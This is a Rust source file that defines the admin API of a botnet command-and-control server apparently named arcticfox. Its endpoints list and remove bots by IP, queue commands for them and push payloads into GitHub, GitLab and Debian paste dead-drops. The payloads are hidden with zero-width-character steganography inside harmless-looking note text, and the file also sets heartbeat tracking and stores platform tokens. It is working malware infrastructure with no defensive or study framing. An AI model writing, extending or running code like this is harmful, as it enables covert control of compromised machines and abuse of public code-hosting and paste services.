//! Admin API routes: full C2 control endpoints.
//!
//! All endpoints require admin Bearer token authentication.

use axum::{
    extract::{Path, State},
    http::StatusCode,
    Json,
};
use std::sync::Arc;
use tracing::{error, info, warn};

use arcticfox_core::config::RepoTarget;
use arcticfox_core::repo;

use crate::{AppState, Role, authenticate, json_err, json_ok, BOT_ALIVE_THRESHOLD};

// ── Repo Management ─────────────────────────────────────────────────────────

/// GET /api/admin/repos — List all repos
pub async fn list_repos(
    State(state): State<Arc<AppState>>,
    headers: axum::http::HeaderMap,
) -> Result<Json<serde_json::Value>, (StatusCode, Json<serde_json::Value>)> {
    let _role = check_admin(&state, headers.get("Authorization").and_then(|v| v.to_str().ok())).await?;

    let config = state.control_config.read().await;
    let repos: Vec<serde_json::Value> = config
        .repos
        .iter()
        .enumerate()
        .map(|(i, r)| {
            serde_json::json!({
                "id": i,
                "owner": r.owner,
                "repo": r.repo,
                "platform": r.platform,
                "branch": r.branch,
                "file_path": r.file_path,
                "alive": r.alive,
                "label": r.label(),
            })
        })
        .collect();

    Ok(json_ok(serde_json::json!({"repos": repos})))
}

/// POST /api/admin/repos — Add a repo
pub async fn add_repo(
    State(state): State<Arc<AppState>>,
    headers: axum::http::HeaderMap,
    Json(body): Json<serde_json::Value>,
) -> Result<Json<serde_json::Value>, (StatusCode, Json<serde_json::Value>)> {
    let _role = check_admin(&state, headers.get("Authorization").and_then(|v| v.to_str().ok())).await?;

    let spec = body
        .get("repo")
        .and_then(|v| v.as_str())
        .ok_or_else(|| json_err("Missing 'repo' field", 400))?;

    let repo = repo::parse_repo_spec(spec).map_err(|e| json_err(&e.to_string(), 400))?;

    let mut config = state.control_config.write().await;
    let idx = config.repos.len();
    config.repos.push(repo);

    Ok(json_ok(serde_json::json!({
        "added": {
            "id": idx,
            "label": config.repos.last().map(|r| r.label()).unwrap_or_default(),
        }
    })))
}

/// DELETE /api/admin/repos/:idx — Remove a repo
pub async fn remove_repo(
    State(state): State<Arc<AppState>>,
    headers: axum::http::HeaderMap,
    Path(idx): Path<usize>,
) -> Result<Json<serde_json::Value>, (StatusCode, Json<serde_json::Value>)> {
    let _role = check_admin(&state, headers.get("Authorization").and_then(|v| v.to_str().ok())).await?;

    let mut config = state.control_config.write().await;
    if idx >= config.repos.len() {
        return Err(json_err("Invalid index", 404));
    }
    let removed = config.repos.remove(idx);
    Ok(json_ok(serde_json::json!({"removed": removed.label()})))
}

/// POST /api/admin/repos/check — Health-check all repos
pub async fn check_repos(
    State(state): State<Arc<AppState>>,
    headers: axum::http::HeaderMap,
) -> Result<Json<serde_json::Value>, (StatusCode, Json<serde_json::Value>)> {
    let _role = check_admin(&state, headers.get("Authorization").and_then(|v| v.to_str().ok())).await?;

    let mut config = state.control_config.write().await;
    let results = repo::check_all_repos(&mut config.repos, &state.http_client).await;

    Ok(json_ok(serde_json::json!({
        "results": results.iter().map(|(label, alive)| {
            serde_json::json!({"label": label, "alive": alive})
        }).collect::<Vec<_>>(),
    })))
}

// ── Command Management ─────────────────────────────────────────────────────

/// GET /api/admin/commands — List queued commands
pub async fn list_commands(
    State(state): State<Arc<AppState>>,
    headers: axum::http::HeaderMap,
) -> Result<Json<serde_json::Value>, (StatusCode, Json<serde_json::Value>)> {
    let _role = check_admin(&state, headers.get("Authorization").and_then(|v| v.to_str().ok())).await?;

    let config = state.control_config.read().await;
    Ok(json_ok(serde_json::json!({"commands": config.commands})))
}

/// POST /api/admin/commands — Add a command
pub async fn add_command(
    State(state): State<Arc<AppState>>,
    headers: axum::http::HeaderMap,
    Json(body): Json<serde_json::Value>,
) -> Result<Json<serde_json::Value>, (StatusCode, Json<serde_json::Value>)> {
    let _role = check_admin(&state, headers.get("Authorization").and_then(|v| v.to_str().ok())).await?;

    let cmd = body
        .get("cmd")
        .and_then(|v| v.as_str())
        .ok_or_else(|| json_err("Missing 'cmd' field", 400))?;

    let mut config = state.control_config.write().await;
    config.commands.push(cmd.to_string());
    let total = config.commands.len();

    Ok(json_ok(serde_json::json!({
        "commands": config.commands,
        "total": total,
    })))
}

/// DELETE /api/admin/commands — Clear all commands
pub async fn clear_commands(
    State(state): State<Arc<AppState>>,
    headers: axum::http::HeaderMap,
) -> Result<Json<serde_json::Value>, (StatusCode, Json<serde_json::Value>)> {
    let _role = check_admin(&state, headers.get("Authorization").and_then(|v| v.to_str().ok())).await?;

    let mut config = state.control_config.write().await;
    config.commands.clear();
    Ok(json_ok(serde_json::json!({"commands": []})))
}

/// DELETE /api/admin/commands/:idx — Remove single command
pub async fn remove_command(
    State(state): State<Arc<AppState>>,
    headers: axum::http::HeaderMap,
    Path(idx): Path<usize>,
) -> Result<Json<serde_json::Value>, (StatusCode, Json<serde_json::Value>)> {
    let _role = check_admin(&state, headers.get("Authorization").and_then(|v| v.to_str().ok())).await?;

    let mut config = state.control_config.write().await;
    if idx >= config.commands.len() {
        return Err(json_err("Invalid index", 404));
    }
    let removed = config.commands.remove(idx);
    Ok(json_ok(serde_json::json!({
        "removed": removed,
        "commands": config.commands,
    })))
}

// ── Push / Pull ─────────────────────────────────────────────────────────────

/// POST /api/admin/push — Push payload to repos
pub async fn push(
    State(state): State<Arc<AppState>>,
    headers: axum::http::HeaderMap,
    Json(body): Json<serde_json::Value>,
) -> Result<Json<serde_json::Value>, (StatusCode, Json<serde_json::Value>)> {
    let _role = check_admin(&state, headers.get("Authorization").and_then(|v| v.to_str().ok())).await?;

    let target_idx = body.get("index").and_then(|v| v.as_u64()).map(|v| v as usize);
    let pad = body.get("pad").and_then(|v| v.as_bool()).unwrap_or(false);

    let config = state.control_config.read().await;
    let payload = repo::build_payload(&config);

    let mut results = Vec::new();

    if let Some(idx) = target_idx {
        if idx >= config.repos.len() {
            return Err(json_err("Invalid index", 404));
        }
        let r = &config.repos[idx];
        match repo::push_to_repo(r, &config, &payload, pad, &state.http_client).await {
            Ok(ok) => results.push(serde_json::json!({"label": r.label(), "success": ok})),
            Err(e) => results.push(serde_json::json!({"label": r.label(), "success": false, "error": e.to_string()})),
        }
    } else {
        let alive_repos: Vec<_> = config.repos.iter().filter(|r| r.alive).collect();
        if alive_repos.is_empty() {
            return Err(json_err("No alive repos. Run check first.", 409));
        }
        for r in alive_repos {
            match repo::push_to_repo(r, &config, &payload, pad, &state.http_client).await {
                Ok(ok) => results.push(serde_json::json!({"label": r.label(), "success": ok})),
                Err(e) => results.push(serde_json::json!({"label": r.label(), "success": false, "error": e.to_string()})),
            }
        }
    }

    Ok(json_ok(serde_json::json!({
        "payload_size": payload.len(),
        "padded": pad,
        "results": results,
    })))
}

/// GET /api/admin/pull/:idx — Pull payload from a repo
pub async fn pull(
    State(state): State<Arc<AppState>>,
    headers: axum::http::HeaderMap,
    Path(idx): Path<usize>,
) -> Result<Json<serde_json::Value>, (StatusCode, Json<serde_json::Value>)> {
    let _role = check_admin(&state, headers.get("Authorization").and_then(|v| v.to_str().ok())).await?;

    let config = state.control_config.read().await;
    if idx >= config.repos.len() {
        return Err(json_err("Invalid index", 404));
    }
    let r = &config.repos[idx];

    match repo::pull_from_repo(r, &config, &state.http_client).await {
        Ok(Some(payload)) => Ok(json_ok(serde_json::json!({
            "repo": r.label(),
            "payload": payload,
        }))),
        Ok(None) => Err(json_err("No payload found", 404)),
        Err(e) => Err(json_err(&e.to_string(), 404)),
    }
}

/// GET /api/admin/preview — Preview the JSON payload
pub async fn preview(
    State(state): State<Arc<AppState>>,
    headers: axum::http::HeaderMap,
) -> Result<Json<serde_json::Value>, (StatusCode, Json<serde_json::Value>)> {
    let _role = check_admin(&state, headers.get("Authorization").and_then(|v| v.to_str().ok())).await?;

    let config = state.control_config.read().await;
    let payload = repo::build_payload(&config);
    let decoded: serde_json::Value = serde_json::from_slice(&payload).unwrap_or_default();

    Ok(json_ok(serde_json::json!({
        "payload": decoded,
        "size_bytes": payload.len(),
    })))
}

/// POST /api/admin/paste — Create Debian paste dead-drop
pub async fn create_paste(
    State(state): State<Arc<AppState>>,
    headers: axum::http::HeaderMap,
) -> Result<Json<serde_json::Value>, (StatusCode, Json<serde_json::Value>)> {
    let _role = check_admin(&state, headers.get("Authorization").and_then(|v| v.to_str().ok())).await?;

    let config = state.control_config.read().await;
    let payload = repo::build_payload(&config);
    let pad = state.api_config.read().await.use_pad;

    let content = "# Notes\n\nMiscellaneous.\n";
    let injected = arcticfox_core::zwcodec::inject(content, &payload, pad)
        .map_err(|e| json_err(&e.to_string(), 500))?;

    match repo::DebianPaste::create(&injected, &state.http_client).await {
        Ok(paste_id) => {
            let mut cfg = state.control_config.write().await;
            cfg.repos.push(RepoTarget {
                owner: String::new(),
                repo: paste_id.clone(),
                platform: "debian".into(),
                branch: String::new(),
                file_path: String::new(),
                alive: true,
            });
            Ok(json_ok(serde_json::json!({
                "paste_id": paste_id,
                "url": format!("https://paste.debian.net/{}", paste_id),
            })))
        }
        Err(e) => Err(json_err(&e.to_string(), 502)),
    }
}

// ── Heartbeat Config ───────────────────────────────────────────────────────

/// GET /api/admin/heartbeat
pub async fn get_heartbeat(
    State(state): State<Arc<AppState>>,
    headers: axum::http::HeaderMap,
) -> Result<Json<serde_json::Value>, (StatusCode, Json<serde_json::Value>)> {
    let _role = check_admin(&state, headers.get("Authorization").and_then(|v| v.to_str().ok())).await?;

    let config = state.control_config.read().await;
    Ok(json_ok(serde_json::json!({
        "redirect": config.heartbeat_redirect,
        "tracking": config.heartbeat_tracking,
        "interval": config.heartbeat_interval,
    })))
}

/// PUT /api/admin/heartbeat
pub async fn set_heartbeat(
    State(state): State<Arc<AppState>>,
    headers: axum::http::HeaderMap,
    Json(body): Json<serde_json::Value>,
) -> Result<Json<serde_json::Value>, (StatusCode, Json<serde_json::Value>)> {
    let _role = check_admin(&state, headers.get("Authorization").and_then(|v| v.to_str().ok())).await?;

    let mut config = state.control_config.write().await;
    if let Some(redirect) = body.get("redirect").and_then(|v| v.as_str()) {
        config.heartbeat_redirect = redirect.to_string();
    }
    if let Some(tracking) = body.get("tracking").and_then(|v| v.as_str()) {
        config.heartbeat_tracking = tracking.to_string();
    }
    if let Some(interval) = body.get("interval").and_then(|v| v.as_u64()) {
        config.heartbeat_interval = interval.max(30);
    }

    Ok(json_ok(serde_json::json!({
        "redirect": config.heartbeat_redirect,
        "tracking": config.heartbeat_tracking,
        "interval": config.heartbeat_interval,
    })))
}

// ── Tokens ─────────────────────────────────────────────────────────────────

/// PUT /api/admin/tokens
pub async fn set_tokens(
    State(state): State<Arc<AppState>>,
    headers: axum::http::HeaderMap,
    Json(body): Json<serde_json::Value>,
) -> Result<Json<serde_json::Value>, (StatusCode, Json<serde_json::Value>)> {
    let _role = check_admin(&state, headers.get("Authorization").and_then(|v| v.to_str().ok())).await?;

    let mut config = state.control_config.write().await;
    if let Some(gh) = body.get("github_token").and_then(|v| v.as_str()) {
        config.github_token = gh.to_string();
    }
    if let Some(gl) = body.get("gitlab_token").and_then(|v| v.as_str()) {
        config.gitlab_token = gl.to_string();
    }

    Ok(json_ok(serde_json::json!({
        "github_token_set": !config.github_token.is_empty(),
        "gitlab_token_set": !config.gitlab_token.is_empty(),
    })))
}

/// PUT /api/admin/padding
pub async fn toggle_padding(
    State(state): State<Arc<AppState>>,
    headers: axum::http::HeaderMap,
    Json(body): Json<serde_json::Value>,
) -> Result<Json<serde_json::Value>, (StatusCode, Json<serde_json::Value>)> {
    let _role = check_admin(&state, headers.get("Authorization").and_then(|v| v.to_str().ok())).await?;

    let mut api_config = state.api_config.write().await;
    if let Some(enabled) = body.get("enabled").and_then(|v| v.as_bool()) {
        api_config.use_pad = enabled;
    } else {
        api_config.use_pad = !api_config.use_pad;
    }
    let pad_enabled = api_config.use_pad;

    // Try to save
    if let Err(e) = api_config.save(std::path::Path::new("api_config.json")) {
        warn!("Failed to save API config: {e}");
    }

    Ok(json_ok(serde_json::json!({"padding": pad_enabled})))
}

/// POST /api/admin/config/save
pub async fn save_config(
    State(state): State<Arc<AppState>>,
    headers: axum::http::HeaderMap,
) -> Result<Json<serde_json::Value>, (StatusCode, Json<serde_json::Value>)> {
    let _role = check_admin(&state, headers.get("Authorization").and_then(|v| v.to_str().ok())).await?;

    let ctrl_config = state.control_config.read().await;
    ctrl_config.save(std::path::Path::new("control_config.json"))
        .map_err(|e| json_err(&e.to_string(), 500))?;

    let api_config = state.api_config.read().await;
    api_config.save(std::path::Path::new("api_config.json"))
        .map_err(|e| json_err(&e.to_string(), 500))?;

    Ok(json_ok(serde_json::json!({"saved": true})))
}

// ── Bots ───────────────────────────────────────────────────────────────────

/// GET /api/admin/bots
pub async fn list_bots(
    State(state): State<Arc<AppState>>,
    headers: axum::http::HeaderMap,
) -> Result<Json<serde_json::Value>, (StatusCode, Json<serde_json::Value>)> {
    let _role = check_admin(&state, headers.get("Authorization").and_then(|v| v.to_str().ok())).await?;

    let bots = state.bots.read().await;
    let now = chrono::Utc::now().timestamp() as f64;

    let mut bot_list: Vec<serde_json::Value> = bots
        .iter()
        .map(|(id, info)| {
            serde_json::json!({
                "id": id,
                "ip": info.ip,
                "first_seen": info.first_seen,
                "last_seen": info.last_seen,
                "hits": info.hits,
                "alive": (now - info.last_seen) < BOT_ALIVE_THRESHOLD,
            })
        })
        .collect();

    bot_list.sort_by(|a, b| {
        b["last_seen"].as_f64().unwrap_or(0.0)
            .partial_cmp(&a["last_seen"].as_f64().unwrap_or(0.0))
            .unwrap_or(std::cmp::Ordering::Equal)
    });

    Ok(json_ok(serde_json::json!({
        "bots": bot_list,
        "total": bot_list.len(),
    })))
}

/// DELETE /api/admin/bots/:bot_id
pub async fn remove_bot(
    State(state): State<Arc<AppState>>,
    headers: axum::http::HeaderMap,
    Path(bot_id): Path<String>,
) -> Result<Json<serde_json::Value>, (StatusCode, Json<serde_json::Value>)> {
    let _role = check_admin(&state, headers.get("Authorization").and_then(|v| v.to_str().ok())).await?;

    let mut bots = state.bots.write().await;
    if bots.remove(&bot_id).is_none() {
        return Err(json_err("Bot not found", 404));
    }

    Ok(json_ok(serde_json::json!({"removed": bot_id})))
}

/// GET /api/admin/stats
pub async fn stats(
    State(state): State<Arc<AppState>>,
    headers: axum::http::HeaderMap,
) -> Result<Json<serde_json::Value>, (StatusCode, Json<serde_json::Value>)> {
    let _role = check_admin(&state, headers.get("Authorization").and_then(|v| v.to_str().ok())).await?;

    let now = chrono::Utc::now().timestamp() as f64;
    let bots = state.bots.read().await;
    let alive_bots = bots.values().filter(|b| (now - b.last_seen) < BOT_ALIVE_THRESHOLD).count();

    let config = state.control_config.read().await;
    let alive_repos = config.repos.iter().filter(|r| r.alive).count();

    Ok(json_ok(serde_json::json!({
        "bots_total": bots.len(),
        "bots_alive": alive_bots,
        "repos_total": config.repos.len(),
        "repos_alive": alive_repos,
        "commands_queued": config.commands.len(),
        "padding_enabled": state.api_config.read().await.use_pad,
    })))
}

// ── Auth Helper ─────────────────────────────────────────────────────────────

async fn check_admin(
    state: &AppState,
    auth_header: Option<&str>,
) -> std::result::Result<Role, (StatusCode, Json<serde_json::Value>)> {
    let role = crate::authenticate(state, auth_header)
        .await
        .map_err(|e| json_err(&e.to_string(), 401))?;

    if role != Role::Admin {
        return Err(json_err("Admin access required", 403));
    }

    Ok(role)
}
